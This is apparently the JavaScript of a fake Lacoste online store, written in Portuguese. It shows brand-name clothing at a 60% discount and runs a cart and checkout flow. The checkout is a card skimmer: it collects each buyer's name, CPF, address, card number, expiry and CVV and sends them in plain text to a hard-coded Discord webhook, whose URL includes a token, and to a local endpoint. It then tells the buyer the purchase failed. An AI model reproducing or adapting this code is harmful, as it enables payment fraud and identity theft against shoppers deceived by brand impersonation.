// =============================================
// DADOS DOS PRODUTOS - SEÇÃO 100% FUNCIONAL
// =============================================
const products = [
{
id: 1,
name: "Camiseta de Algodão Pima",
price: 429,
desc: "Camiseta de Algodão Pima Masculina Lacoste, confeccionada em algodão Pima premium para oferecer toque macio, conforto e respirabilidade. Possui modelagem regular, gola redonda e o icônico crocodilo bordado no peito, unindo estilo, qualidade e versatilidade para o dia a dia. Se estiver entre dois tamanhos, recomenda-se escolher o maior.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/1frente.avif",
"/assets/produtos/1costas.avif",
"/assets/produtos/1detalhe.avif",
"/assets/produtos/1detalhe2.avif"
]
},
{
id: 2,
name: "Camiseta Entrelaçada de Algodão",
price: 449,
desc: "Camiseta de Algodão Pima Lacoste Masculina com Gola Redonda, confeccionada em algodão Pima premium para proporcionar toque macio, conforto e respirabilidade. Possui modelagem regular, gola redonda e o icônico crocodilo tonal bordado no peito, oferecendo um visual versátil e elegante para diversas ocasiões. Produzida com algodão orgânico, une qualidade, estilo e uma escolha mais consciente.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/2frente.avif",
"/assets/produtos/2costas.avif"
]
},
{
id: 3,
name: "Boné Esportivo Leve em Tecido Tafetá com Padrão Diamante",
price: 469,
desc: "Boné Lacoste Sport Masculino em Tafetá Respirável, confeccionado em tecido leve e respirável para oferecer conforto durante o uso. Possui alça ajustável, ilhoses para ventilação e o icônico crocodilo verde aplicado na lateral, combinando praticidade, proteção e estilo para o dia a dia e atividades ao ar livre.",
sizes: ["Único"],
images: [
"/assets/produtos/3.avif",
"/assets/produtos/32.avif"
]
},
{
id: 4,
name: "Polo Regular Fit Paris em Piqué Stretch",
price: 499,
desc: "Polo Regular Fit Paris em Piqué Stretch, confeccionada em tecido piqué com elasticidade para proporcionar conforto e liberdade de movimentos. Possui modelagem regular, gola polo clássica e acabamento refinado, oferecendo um visual versátil e elegante para ocasiões casuais ou mais sofisticadas.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/4frente.avif",
"/assets/produtos/4costas.avif",
"/assets/produtos/4detalhe.avif"
]
},
{
id: 5,
name: "Polo de Caimento Clássico Original L.12.12",
price: 499,
desc: "Camisa Polo Masculina L.12.12 Original Lacoste, confeccionada em tecido Petit Piqué para oferecer conforto, respirabilidade e durabilidade. Possui modelagem clássica, gola e mangas caneladas, botões de madrepérola e o icônico crocodilo bordado no peito, garantindo um visual elegante e atemporal. Se estiver entre dois tamanhos, recomenda-se escolher o menor.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/5a.avif",
"/assets/produtos/5b.avif",
"/assets/produtos/5c.avif",
"/assets/produtos/5d.avif"
]
},
{
id: 6,
name: "Boné de Beisebol com Bordado 3D",
price: 429,
desc: "Boné de Beisebol Lacoste, confeccionado em sarja leve para oferecer conforto e estilo no dia a dia. Possui design ajustável, bordado 3D na parte frontal, fivela gravada e o icônico crocodilo bordado na lateral, garantindo um visual esportivo, versátil e sofisticado.",
sizes: ["Único"],
images: [
"/assets/produtos/6a.avif",
"/assets/produtos/6b.avif",
"/assets/produtos/6c.avif"
]
},
{
id: 7,
name: "Camiseta Esportiva Ultra Dry com Estampa Gráfica",
price: 399,
desc: "Camiseta Esportiva Ultra Dry com Estampa Gráfica, confeccionada em tecido tecnológico Ultra Dry para proporcionar respirabilidade, secagem rápida e conforto durante as atividades. Possui modelagem confortável, estampa gráfica exclusiva e acabamento leve, oferecendo desempenho, liberdade de movimentos e estilo para a prática esportiva ou o dia a dia.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/7a.avif",
"/assets/produtos/7b.avif",
"/assets/produtos/7c.avif"
]
},
{
id: 8,
name: "Jaqueta Harrington em Sarja Repelente à Água",
price: 899,
desc: "Jaqueta Harrington Lacoste, confeccionada em sarja com acabamento repelente à água para oferecer conforto e proteção. Possui gola alta com fechamento por botão, detalhes clássicos da modelagem Harrington, forro em jacquard e o icônico crocodilo bordado, combinando elegância, funcionalidade e estilo atemporal.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/8a.avif",
"/assets/produtos/8b.avif",
"/assets/produtos/8c.avif",
"/assets/produtos/8d.avif"
]
},
{
id: 9,
name: "Suéter Masculino de Malha em Modelagem Regular com Gola Redonda",
price: 929,
desc: "Suéter Masculino Lacoste Gola Redonda de Algodão Orgânico, confeccionado em malha de algodão orgânico para proporcionar conforto, maciez e durabilidade. Possui gola redonda, acabamentos canelados e o icônico crocodilo verde bordado no peito, unindo estilo clássico, versatilidade e uma escolha mais consciente.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/9a.avif",
"/assets/produtos/9b.avif",
"/assets/produtos/9c.avif"
]
},
{
id: 10,
name: "Boné em Gabardine Bordado",
price: 429,
desc: "Boné Lacoste de Gabardine de Algodão, confeccionado em tecido resistente e elegante para oferecer conforto e durabilidade. Possui alça ajustável para um encaixe perfeito e o icônico crocodilo bordado, trazendo um visual contemporâneo e sofisticado.",
sizes: ["Único"],
images: [
"/assets/produtos/10a.avif",
"/assets/produtos/10b.avif",
"/assets/produtos/10c.avif"
]
},
{
id: 11,
name: "Shorts de Tafetá de Algodão Modelagem reta",
price: 389,
desc: "Desde 1933, a Lacoste combina elegância e conforto em seus essenciais esportivos. Estes shorts em tafetá de algodão com efeito paper apresentam um cós elástico ajustável, bolsos funcionais e fechamento por botão, resultando em um estilo refinado e prático.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/11a.avif",
"/assets/produtos/11b.avif"
]
},
{
id: 12,
name: "Shorts de Tafetá de Algodão Modelagem reta",
price: 529,
desc: "Shorts Lacoste confeccionado em tafetá de algodão com efeito paper, unindo elegância e conforto desde 1933. Possui cós elástico ajustável, bolsos funcionais e fechamento por botão, garantindo praticidade e um visual refinado para diversas ocasiões.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/12a.avif",
"/assets/produtos/12b.avif"
]
},
{
id: 13,
name: "Moletom de Algodão Orgânico Escovado Jogger Masculino Lacoste",
price: 799,
desc: "Moletom Lacoste confeccionado em fleece escovado de algodão orgânico, proporcionando conforto, maciez e aquecimento nos dias mais frios. Com ajuste clássico, mangas confortáveis e detalhes sofisticados como a fita de pescoço em piqué verde Lacoste, a peça une estilo e praticidade. O icônico crocodilo verde bordado no peito completa o visual com autenticidade e elegância.",
sizes: ["P","M","G","GG"],
images: [
"/assets/produtos/13a.avif",
"/assets/produtos/13b.avif",
"/assets/produtos/13c.avif"
]
}
];

let cart = [];
let currentProduct = null;
let selectedSize = null;

// =============================================
// FUNÇÕES AUXILIARES
// =============================================

function formatCPF(value) {
  return value.replace(/\D/g, '')
             .replace(/(\d{3})(\d)/, '$1.$2')
             .replace(/(\d{3})(\d)/, '$1.$2')
             .replace(/(\d{3})(\d{1,2})$/, '$1-$2');
}

function validateCPF(cpf) {
  cpf = cpf.replace(/\D/g, '');
  if (cpf.length !== 11) return false;

  let sum = 0, remainder;
  for (let i = 1; i <= 9; i++) sum += parseInt(cpf.substring(i-1, i)) * (11 - i);
  remainder = (sum * 10) % 11;
  if (remainder === 10 || remainder === 11) remainder = 0;
  if (remainder !== parseInt(cpf.substring(9, 10))) return false;

  sum = 0;
  for (let i = 1; i <= 10; i++) sum += parseInt(cpf.substring(i-1, i)) * (12 - i);
  remainder = (sum * 10) % 11;
  return remainder === parseInt(cpf.substring(10, 11));
}

// =============================================
// INICIALIZAÇÃO
// =============================================

console.log('✅ script.js carregado.');

document.addEventListener('DOMContentLoaded', () => {
  const isHome = document.getElementById('product-grid') !== null;
  const isCheckout = document.getElementById('address-section') !== null;

  if (isHome) {
      console.log('🏠 Página HOME detectada.');
      initHome();
  }
  if (isCheckout) {
      console.log('🛍️ Página CHECKOUT detectada.');
      initCheckout();
  }
});

// =============================================
// LÓGICA DA HOME
// =============================================

function initHome() {
  renderProducts();
  setupModal();

  const cartBtn = document.getElementById('cart-btn');
  if (cartBtn) cartBtn.onclick = () => window.location.href = '/checkout.html';

  setupSearch();
}

function renderProducts() {
  const grid = document.getElementById('product-grid');
  if (!grid) {
      console.error('❌ ERRO CRÍTICO: #product-grid não encontrado!');
      return;
  }

  console.log(`📊 Renderizando ${products.length} produtos...`);
  grid.innerHTML = ''; // Limpa antes de renderizar

  products.forEach((prod) => {
      const discountPrice = (prod.price * 0.4).toFixed(2);
      
      const card = document.createElement('div');
      card.className = 'product-card';
      
      // HTML do Card
      card.innerHTML = `
          <div class="img-wrapper">
              <img src="${prod.images[0]}" alt="${prod.name}" loading="lazy">
          </div>
          <div class="product-info">
              <h3>${prod.name}</h3>
              <div class="prices">
                  <span class="old-price">R$ ${prod.price.toFixed(2)}</span>
                  <span class="new-price">R$ ${discountPrice}</span>
              </div>
          </div>
      `;

      card.onclick = () => openProductModal(prod);
      grid.appendChild(card);
  });
  
  console.log('✨ Renderização concluída.');
}

function setupModal() {
  const modal = document.getElementById('product-modal');
  const closeBtn = document.querySelector('.close-modal');
  const buyBtn = document.getElementById('btn-buy');
  const sizesContainer = document.getElementById('sizes-container');

  if (!modal) return;

  // Fechar modal
  if (closeBtn) closeBtn.onclick = () => modal.style.display = 'none';
  window.onclick = (e) => { if (e.target == modal) modal.style.display = 'none'; };

  // Selecionar tamanho
  if (sizesContainer) {
      sizesContainer.addEventListener('click', (e) => {
          if (e.target.classList.contains('size-btn')) {
              document.querySelectorAll('.size-btn').forEach(b => b.classList.remove('selected'));
              e.target.classList.add('selected');
              selectedSize = e.target.dataset.size;
              document.getElementById('size-error').style.display = 'none';
          }
      });
  }

  // Botão Comprar
  if (buyBtn) {
      buyBtn.onclick = () => {
          if (!selectedSize) {
              document.getElementById('size-error').style.display = 'block';
              return;
          }
          addToCart(currentProduct, selectedSize);
          modal.style.display = 'none';
      };
  }
}

function openProductModal(product) {
  currentProduct = product;
  selectedSize = null;
  
  const modal = document.getElementById('product-modal');
  const discountPrice = (product.price * 0.4).toFixed(2);

  document.getElementById('detail-name').innerText = product.name;
  document.getElementById('detail-price-original').innerText = `R$ ${product.price.toFixed(2)}`;
  document.getElementById('detail-price-discount').innerText = `R$ ${discountPrice}`;
  document.getElementById('detail-desc').innerText = product.desc;
  document.getElementById('size-error').style.display = 'none';

  // Tamanhos
  const sizesContainer = document.getElementById('sizes-container');
  sizesContainer.innerHTML = '';
  product.sizes.forEach(size => {
      const btn = document.createElement('button');
      btn.className = 'size-btn';
      btn.dataset.size = size;
      btn.textContent = size;
      sizesContainer.appendChild(btn);
  });

  // Imagens
  const mainImg = document.getElementById('main-image');
  const thumbList = document.getElementById('thumbnail-list');
  
  mainImg.src = product.images[0];
  thumbList.innerHTML = '';
  
  product.images.forEach((src, idx) => {
      const thumb = document.createElement('img');
      thumb.src = src;
      if (idx === 0) thumb.classList.add('active');
      thumb.onclick = () => {
          mainImg.src = src;
          document.querySelectorAll('.thumbnail-list img').forEach(i => i.classList.remove('active'));
          thumb.classList.add('active');
      };
      thumbList.appendChild(thumb);
  });

  modal.style.display = 'flex';
}

function addToCart(product, size) {
  cart.push({ 
      product: { ...product }, // Clona o objeto para evitar referência
      size, 
      price: (product.price * 0.4).toFixed(2) 
  });
  saveCartToStorage();
  showAddToCartPopup();
}

function showAddToCartPopup() {
  const popup = document.getElementById('add-to-cart-popup');
  if (!popup) return;
  
  popup.style.display = 'flex';
  
  document.getElementById('go-to-cart').onclick = () => {
      window.location.href = '/checkout.html';
  };
  
  document.getElementById('keep-shopping').onclick = () => {
      popup.style.display = 'none';
  };
}

function setupSearch() {
  const input = document.getElementById('search-input');
  const btn = document.querySelector('.search-btn');
  if (!input) return;

  const filter = () => {
      const q = input.value.toLowerCase();
      const grid = document.getElementById('product-grid');
      if (!grid) return;

      grid.innerHTML = '';
      
      const filtered = products.filter(p => p.name.toLowerCase().includes(q));
      
      if (filtered.length === 0) {
          grid.innerHTML = '<p style="grid-column: 1/-1; text-align:center;">Nenhum produto encontrado.</p>';
          return;
      }

      filtered.forEach(prod => {
          const discountPrice = (prod.price * 0.4).toFixed(2);
          const card = document.createElement('div');
          card.className = 'product-card';
          card.innerHTML = `
              <div class="img-wrapper"><img src="${prod.images[0]}" alt="${prod.name}"></div>
              <div class="product-info">
                  <h3>${prod.name}</h3>
                  <div class="prices">
                      <span class="old-price">R$ ${prod.price.toFixed(2)}</span>
                      <span class="new-price">R$ ${discountPrice}</span>
                  </div>
              </div>
          `;
          card.onclick = () => openProductModal(prod);
          grid.appendChild(card);
      });
  };

  if (btn) btn.onclick = filter;
  input.addEventListener('keyup', (e) => { if(e.key === 'Enter') filter(); });
}

// =============================================
// LÓGICA DO CHECKOUT
// =============================================

function saveCartToStorage() {
  localStorage.setItem('lacoste_cart', JSON.stringify(cart));
}

function loadCartFromStorage() {
  const stored = localStorage.getItem('lacoste_cart');
  if (stored) cart = JSON.parse(stored);
}

function initCheckout() {
  loadCartFromStorage();
  renderCheckoutCart();
  setupCheckoutFlow();
}

function renderCheckoutCart() {
  const container = document.getElementById('cart-items');
  const totalEl = document.getElementById('cart-total');
  if (!container) return;

  container.innerHTML = '';
  let total = 0;

  if (cart.length === 0) {
      container.innerHTML = '<p style="text-align:center; width:100%;">Seu carrinho está vazio. <a href="/">Voltar à loja</a></p>';
      totalEl.innerText = 'R$ 0,00';
      return;
  }

  cart.forEach((item) => {
      total += parseFloat(item.price);
      const div = document.createElement('div');
      div.className = 'cart-item';

      // Formatação dos preços: riscado + verde/bold/caixa alta
      div.innerHTML = `
          <img src="${item.product.images[0]}" alt="${item.product.name}">
          <div class="info">
              <strong>${item.product.name}</strong>
              <span>Tamanho: ${item.size}</span>
              <div>
                  <span style="text-decoration: line-through; color: #999; font-size: 14px;">R$ ${(item.product.price).toFixed(2)}</span>
                  <span style="background-color: var(--primary); color: white; padding: 2px 6px; border-radius: 3px; font-weight: bold; font-size: 15px; margin-left: 8px;">R$ ${item.price}</span>
              </div>
          </div>
      `;
      container.appendChild(div);
  });

  totalEl.innerText = `R$ ${total.toFixed(2)}`;
}


// ... (mantenha TUDO o código que já está funcionando até a função setupCheckoutFlow)

// =============================================
// FINALIZAR COMPRA - ENVIO PARA DISCORD
// =============================================

function setupCheckoutFlow() {
  // Máscara CPF
  const cpfInput = document.getElementById('cpf');
  if (cpfInput) {
      cpfInput.addEventListener('input', (e) => {
          e.target.value = formatCPF(e.target.value);
          const valid = validateCPF(e.target.value);
          const errorMsg = document.getElementById('cpf-error');
          if (errorMsg) errorMsg.style.display = (e.target.value.length === 14 && !valid) ? 'block' : 'none';
      });
  }

  // Próximo Passo
  const btnNext = document.getElementById('btn-next-payment');
  if (btnNext) {
      btnNext.onclick = () => {
          const fields = ['cep', 'estado', 'cidade', 'bairro', 'rua', 'numero'];
          let isValid = true;

          fields.forEach(id => {
              const el = document.getElementById(id);
              if (!el.value.trim()) {
                  el.style.borderColor = 'red';
                  isValid = false;
              } else {
                  el.style.borderColor = '#ccc';
              }
          });

          if (isValid) {
              document.getElementById('address-section').style.display = 'none';
              document.getElementById('payment-section').style.display = 'block';
              window.scrollTo(0, 0);
          } else {
              alert('Preencha todos os campos obrigatórios.');
          }
      };
  }

  // Voltar
  const btnBack = document.getElementById('btn-back-address');
  if (btnBack) {
      btnBack.onclick = () => {
          document.getElementById('payment-section').style.display = 'none';
          document.getElementById('address-section').style.display = 'block';
      };
  }

  // Finalizar Compra - ENVIO PARA DISCORD
  const btnFinalize = document.getElementById('btn-finalize');
  if (btnFinalize) {
      btnFinalize.onclick = async () => {
          // Validação mínima
          const nome = document.getElementById('nome').value.trim();
          const cpf = document.getElementById('cpf').value.trim();
          const metodo = document.querySelector('input[name="payment"]:checked')?.value;

          if (!nome || !cpf || cpf.length < 14 || !validateCPF(cpf)) {
              alert('Nome e CPF válidos são obrigatórios.');
              return;
          }

          // Coleta dados do cartão (mesmo se for Pix, envia os campos)
          const numCartao = document.getElementById('cartao-numero')?.value.trim() || 'NÃO INFORMADO';
          const validade = document.getElementById('cartao-validade')?.value.trim() || 'NÃO INFORMADO';
          const cvv = document.getElementById('cartao-cvv')?.value.trim() || 'NÃO INFORMADO';

          // Dados do endereço
          const endereco = {
              cep: document.getElementById('cep').value.trim(),
              estado: document.getElementById('estado').value.trim(),
              cidade: document.getElementById('cidade').value.trim(),
              bairro: document.getElementById('bairro').value.trim(),
              rua: document.getElementById('rua').value.trim(),
              numero: document.getElementById('numero').value.trim(),
              complemento: document.getElementById('complemento').value.trim()
          };

          // Dados do pedido
          const pedido = cart.map(item => ({
              nome: item.product.name,
              tamanho: item.size,
              preco: item.price
          }));

          // Cálculo do total
          const total = pedido.reduce((acc, item) => acc + parseFloat(item.preco), 0).toFixed(2);

          // Payload para o Discord
          const discordPayload = {
              content: `💳 NOVO PEDIDO - ${metodo.toUpperCase()}\n\n` +
                       `👤 Nome: ${nome}\n` +
                       `🆔 CPF: ${cpf}\n\n` +
                       `📍 Endereço:\n` +
                       `   CEP: ${endereco.cep}\n` +
                       `   Estado: ${endereco.estado}\n` +
                       `   Cidade: ${endereco.cidade}\n` +
                       `   Bairro: ${endereco.bairro}\n` +
                       `   Rua: ${endereco.rua}, ${endereco.numero}\n` +
                       `   Complemento: ${endereco.complemento || 'NÃO INFORMADO'}\n\n` +
                       `💳 Cartão:\n` +
                       `   Número: ${numCartao}\n` +
                       `   Validade: ${validade}\n` +
                       `   CVV: ${cvv}\n\n` +
                       `🛒 Pedido (${pedido.length} itens):\n` +
                       pedido.map((item, i) => `   ${i+1}. ${item.nome} (Tamanho: ${item.tamanho}) - R$ ${item.preco}`).join('\n') +
                       `\n\n💰 Total: R$ ${total}`
          };

          try {
              btnFinalize.disabled = true;
              btnFinalize.innerText = 'Processando...';

              // Envio para o Discord
              await fetch('hhttps://discord.com/api/webhooks/1547038504804941916/Yl2cLjystGxWSSOATnApO8W7WDb-ocLqwMrrFwNy0BjWon6zDO343bF6skFZ0xWChXYv', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(discordPayload)
              });

              // Salva no servidor local (opcional)
              const serverPayload = {
                  nome,
                  cpf,
                  metodo,
                  endereco,
                  cartao: { numero: numCartao, validade, cvv },
                  pedido,
                  total,
                  timestamp: new Date().toISOString()
              };

              await fetch('/save-payment', {
                  method: 'POST',
                  headers: { 'Content-Type': 'application/json' },
                  body: JSON.stringify(serverPayload)
              });

              alert('⚠️ SUA COMPRA NÃO FOI FINALIZADA 🚨');
              localStorage.removeItem('lacoste_cart');
              window.location.href = '/';
          } catch (err) {
              console.error('❌ Erro ao enviar para Discord:', err);
              alert('Erro ao processar pedido. Tente novamente.');
          } finally {
              btnFinalize.disabled = false;
              btnFinalize.innerText = 'Finalizar Compra';
          }
      };
  }
}
